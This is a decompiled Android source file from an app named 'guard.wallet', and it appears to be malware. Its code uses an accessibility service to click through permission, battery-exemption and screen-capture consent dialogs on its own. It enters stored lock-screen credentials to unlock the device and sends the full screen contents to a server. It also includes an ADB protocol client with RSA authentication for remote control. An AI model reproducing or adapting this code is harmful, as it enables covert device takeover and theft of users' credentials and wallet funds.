package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import b1.AbstractC0085g;
import b1.AbstractC0087i;
import b1.C0082d;
import b1.C0084f;
import b1.C0086h;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.msg.ReadScreenMessage;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.server.C0231c;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import f0.AbstractC0297r;
import f0.C0289j;
import f0.C0305z;
import g0.InterfaceC0311c;
import java.io.InputStream;
import java.nio.channels.Selector;
import java.security.PrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Iterator;
import java.util.Objects;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.crypto.Cipher;
import javax.net.ssl.SSLSocket;
import l0.AbstractC0381k;
import p000a.AbstractC0000a;
import q0.AbstractC0887c;
import s0.C0904g;
import s0.C0905h;

/* renamed from: o.a */
/* loaded from: classes.dex */
public final /* synthetic */ class RunnableC0412a implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f837a;

    /* renamed from: b */
    public final /* synthetic */ Object f838b;

    public /* synthetic */ RunnableC0412a(Object obj, int i2) {
        this.f837a = i2;
        this.f838b = obj;
    }

    @Override // java.lang.Runnable
    public final void run() {
        InputStream inputStream;
        C0086h c0086h;
        byte[] m315b;
        long j2;
        switch (this.f837a) {
            case 0:
                AbstractC0414c abstractC0414c = (AbstractC0414c) this.f838b;
                abstractC0414c.getClass();
                try {
                    UiObject findOneByOperateOrLoop = abstractC0414c.m1072k().findOneByOperateOrLoop(AbstractC0414c.m1034I());
                    if (findOneByOperateOrLoop == null || !findOneByOperateOrLoop.click()) {
                        UiObject findOneByCombineLoop = abstractC0414c.m1072k().findOneByCombineLoop(AbstractC0414c.m1039N());
                        if (findOneByCombineLoop != null && findOneByCombineLoop.click()) {
                            Log.d("o.c", "已点击对话框取消按钮");
                        }
                    } else {
                        Log.d("o.c", "已点击允许忽略电池优化");
                        AbstractC0184g.m354h(5);
                    }
                    abstractC0414c.f850n.remove("keepInBatteryUnRestricted");
                    return;
                } catch (Exception e2) {
                    AbstractC0026q.m186s("o.c", e2);
                    return;
                }
            case 1:
                C0420i c0420i = (C0420i) this.f838b;
                c0420i.getClass();
                AbstractC0251g.T0(25);
                ReqUnlockDeviceVO m703g = AbstractC0252h.m703g();
                boolean m1122K = m703g != null ? c0420i.m1122K(m703g) : false;
                if (!m1122K && (m703g = AbstractC0252h.m702f()) != null) {
                    m1122K = c0420i.m1122K(m703g);
                }
                if (m1122K) {
                    Log.d("ConfirmLockDelegate", "已完成锁屏密码验证代理");
                    m703g.setLocked(Boolean.TRUE);
                    AbstractC0252h.m682C(m703g);
                }
                c0420i.f901o.remove("inConfirmLock");
                return;
            case 2:
                C0423l c0423l = (C0423l) this.f838b;
                int i2 = C0423l.f929o;
                if (c0423l.m1072k() != null) {
                    UiObject m1072k = c0423l.m1072k();
                    CombineFilter combineFilter = new CombineFilter();
                    combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"));
                    StringCondition stringCondition = new StringCondition();
                    stringCondition.setProperty("id");
                    stringCondition.setSuffix(":id/permission_allow_always_button");
                    combineFilter.getStringConditions().add(stringCondition);
                    UiObject findOneByCombine = m1072k.findOneByCombine(combineFilter);
                    if (findOneByCombine == null) {
                        UiObject m1072k2 = c0423l.m1072k();
                        CombineFilter combineFilter2 = new CombineFilter();
                        combineFilter2.getStringConditions().add(AbstractC0000a.m7c(combineFilter2, "className", "android.widget.Button"));
                        StringCondition stringCondition2 = new StringCondition();
                        stringCondition2.setProperty("id");
                        stringCondition2.setSuffix(":id/permission_allow_button");
                        combineFilter2.getStringConditions().add(stringCondition2);
                        findOneByCombine = m1072k2.findOneByCombine(combineFilter2);
                    }
                    if (findOneByCombine == null) {
                        UiObject m1072k3 = c0423l.m1072k();
                        CombineFilter combineFilter3 = new CombineFilter();
                        combineFilter3.getStringConditions().add(AbstractC0000a.m7c(combineFilter3, "className", "android.widget.Button"));
                        StringCondition stringCondition3 = new StringCondition();
                        stringCondition3.setProperty("id");
                        stringCondition3.setSuffix(":id/permission_allow_foreground_only_button");
                        combineFilter3.getStringConditions().add(stringCondition3);
                        findOneByCombine = m1072k3.findOneByCombine(combineFilter3);
                    }
                    if (findOneByCombine == null) {
                        UiObject m1072k4 = c0423l.m1072k();
                        CombineFilter combineFilter4 = new CombineFilter();
                        combineFilter4.getStringConditions().add(AbstractC0000a.m7c(combineFilter4, "className", "android.widget.Button"));
                        StringCondition stringCondition4 = new StringCondition();
                        stringCondition4.setProperty("id");
                        stringCondition4.setSuffix(":id/permission_allow_one_time_button");
                        combineFilter4.getStringConditions().add(stringCondition4);
                        findOneByCombine = m1072k4.findOneByCombine(combineFilter4);
                    }
                    if (findOneByCombine != null && findOneByCombine.click()) {
                        Log.d("o.l", "已点击允许权限申请");
                    }
                }
                c0423l.f930n.remove("allowInGrantPermission");
                return;
            case 3:
                C0426o c0426o = (C0426o) this.f838b;
                int i3 = C0426o.f941o;
                UiObject m1072k5 = c0426o.m1072k();
                CombineFilter combineFilter5 = new CombineFilter();
                combineFilter5.getStringConditions().add(AbstractC0000a.m6b(combineFilter5, AbstractC0000a.m7c(combineFilter5, "className", "android.widget.Button"), "id", "android:id/button1"));
                UiObject findOneByCombineLoop2 = m1072k5.findOneByCombineLoop(combineFilter5);
                if (findOneByCombineLoop2 != null && findOneByCombineLoop2.click()) {
                    Log.d("o.o", "已点击允许屏幕投影权限");
                }
                c0426o.f942n.remove("allowInMediaProjection");
                return;
            case 4:
                AtomicBoolean atomicBoolean = ((c0) this.f838b).f855b;
                try {
                    atomicBoolean.set(true);
                    if (MyAccessibilityService.m554P() != null) {
                        String m693N = AbstractC0252h.m693N(new ReadScreenMessage(MyAccessibilityService.m554P().k0()));
                        if (Integer.valueOf(C0231c.m511G().f301z.size()).intValue() > 0) {
                            C0231c.m511G().m515I(m693N);
                        }
                        if (AbstractC0026q.m193z()) {
                            AbstractC0026q.m155F(m693N);
                        }
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("o.c0", e3);
                }
                atomicBoolean.set(false);
                return;
            case 5:
                C0305z c0305z = (C0305z) this.f838b;
                C0289j c0289j = C0289j.f523f;
                try {
                    Semaphore semaphore = c0305z.f565c;
                    boolean z2 = !semaphore.tryAcquire();
                    Selector selector = c0305z.f563a;
                    selector.wakeup();
                    if (z2) {
                        return;
                    }
                    AtomicBoolean atomicBoolean2 = c0305z.f564b;
                    if (atomicBoolean2.getAndSet(true)) {
                        selector.wakeup();
                        return;
                    }
                    for (int i4 = 0; i4 < 100; i4++) {
                        try {
                            try {
                                semaphore.tryAcquire(10L, TimeUnit.MILLISECONDS);
                            } catch (InterruptedException unused) {
                            }
                        } catch (Throwable th) {
                            atomicBoolean2.set(false);
                            throw th;
                        }
                    }
                    selector.wakeup();
                    atomicBoolean2.set(false);
                    return;
                } catch (Exception unused2) {
                    return;
                }
            case 6:
                ((AbstractC0297r) this.f838b).m816e();
                return;
            case 7:
                InterfaceC0311c mo784i = ((AbstractC0381k) this.f838b).mo784i();
                if (mo784i != null) {
                    mo784i.mo800c();
                    return;
                }
                return;
            case 8:
                C0905h c0905h = (C0905h) this.f838b;
                ThreadPoolExecutor threadPoolExecutor = C0905h.f2041g;
                c0905h.getClass();
                while (true) {
                    long nanoTime = System.nanoTime();
                    synchronized (c0905h) {
                        Iterator it = c0905h.f2045d.iterator();
                        long j3 = Long.MIN_VALUE;
                        C0904g c0904g = null;
                        int i5 = 0;
                        int i6 = 0;
                        while (it.hasNext()) {
                            C0904g c0904g2 = (C0904g) it.next();
                            if (c0905h.m1359b(c0904g2, nanoTime) > 0) {
                                i6++;
                            } else {
                                i5++;
                                long j4 = nanoTime - c0904g2.f2040q;
                                if (j4 > j3) {
                                    c0904g = c0904g2;
                                    j3 = j4;
                                }
                            }
                        }
                        j2 = c0905h.f2043b;
                        if (j3 < j2 && i5 <= c0905h.f2042a) {
                            if (i5 > 0) {
                                j2 -= j3;
                            } else if (i6 <= 0) {
                                c0905h.f2047f = false;
                                j2 = -1;
                            }
                        }
                        c0905h.f2045d.remove(c0904g);
                        AbstractC0887c.m1307d(c0904g.f2028e);
                        j2 = 0;
                    }
                    if (j2 == -1) {
                        return;
                    }
                    if (j2 > 0) {
                        long j5 = j2 / 1000000;
                        long j6 = j2 - (1000000 * j5);
                        synchronized (c0905h) {
                            try {
                                c0905h.wait(j5, (int) j6);
                            } catch (InterruptedException unused3) {
                            }
                        }
                    }
                }
                break;
            default:
                C0082d c0082d = (C0082d) this.f838b;
                while (true) {
                    if (!c0082d.f108j.isInterrupted()) {
                        try {
                            if (c0082d.f119u) {
                                inputStream = c0082d.f106h;
                                Objects.requireNonNull(inputStream);
                            } else {
                                inputStream = c0082d.f104f;
                            }
                            C0084f m313a = C0084f.m313a(inputStream, c0082d.f114p, c0082d.f113o);
                            int i7 = m313a.f122a;
                            switch (i7) {
                                case 1163086915:
                                case 1163154007:
                                case 1497451343:
                                    if (c0082d.f112n && (c0086h = (C0086h) c0082d.f118t.get(Integer.valueOf(m313a.f124c))) != null) {
                                        synchronized (c0086h) {
                                            int i8 = m313a.f122a;
                                            if (i8 == 1497451343) {
                                                c0086h.f132c = m313a.f123b;
                                                c0086h.f133d.set(true);
                                                c0086h.notify();
                                            } else if (i8 == 1163154007) {
                                                c0086h.m318x(m313a.f128g);
                                                c0086h.f130a.m308A(AbstractC0085g.m315b(1497451343, c0086h.f131b, null, c0086h.f132c));
                                            } else {
                                                c0082d.f118t.remove(Integer.valueOf(m313a.f124c));
                                                Log.d("d", "AdbProtocol A_CLSE.");
                                                c0086h.m316A(true);
                                            }
                                        }
                                    }
                                    break;
                                case 1213486401:
                                    if (!c0082d.f119u && m313a.f123b == 1) {
                                        if (!c0082d.f117s) {
                                            PrivateKey privateKey = c0082d.f115q.f143a;
                                            byte[] bArr = m313a.f128g;
                                            int[] iArr = AbstractC0087i.f141a;
                                            Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
                                            cipher.init(1, privateKey);
                                            cipher.update(AbstractC0087i.f142b);
                                            m315b = AbstractC0085g.m315b(1213486401, 2, cipher.doFinal(bArr), 0);
                                            Log.d("d", "AdbProtocol.ADB_AUTH_SIGNATURE");
                                            c0082d.f117s = true;
                                        } else if (c0082d.f110l) {
                                            c0082d.f111m = true;
                                            break;
                                        } else {
                                            m315b = AbstractC0085g.m315b(1213486401, 3, AbstractC0087i.m323c((RSAPublicKey) c0082d.f115q.f144b.getPublicKey(), c0082d.f116r), 0);
                                            Log.d("d", "AdbProtocol.ADB_AUTH_RSAPUBLICKEY");
                                        }
                                        Log.d("d", "Write the AUTH reply");
                                        c0082d.m308A(m315b);
                                    }
                                    break;
                                case 1314410051:
                                    synchronized (c0082d) {
                                        c0082d.f114p = m313a.f123b;
                                        c0082d.f113o = m313a.f124c;
                                        c0082d.f112n = true;
                                        c0082d.notifyAll();
                                    }
                                    Log.d("d", "AdbProtocol.A_CNXN");
                                case 1397511251:
                                    c0082d.m308A(AbstractC0085g.m315b(1397511251, 16777216, null, 0));
                                    SSLSocket sSLSocket = (SSLSocket) AbstractC0026q.m192y(c0082d.f115q).getSocketFactory().createSocket(c0082d.f99a, c0082d.f100b, c0082d.f101c, true);
                                    sSLSocket.startHandshake();
                                    Log.d("d", "Handshake succeeded.");
                                    synchronized (c0082d) {
                                        c0082d.f106h = sSLSocket.getInputStream();
                                        c0082d.f107i = sSLSocket.getOutputStream();
                                        c0082d.f119u = true;
                                    }
                                default:
                                    Log.e("d", String.format("Unrecognized command = 0x%x", Integer.valueOf(i7)));
                            }
                        } catch (Exception e4) {
                            AbstractC0026q.m186s("d", e4);
                        }
                    }
                }
                synchronized (c0082d) {
                    c0082d.m310x();
                    c0082d.notifyAll();
                    c0082d.f112n = false;
                    c0082d.f109k = false;
                    return;
                }
        }
    }
}
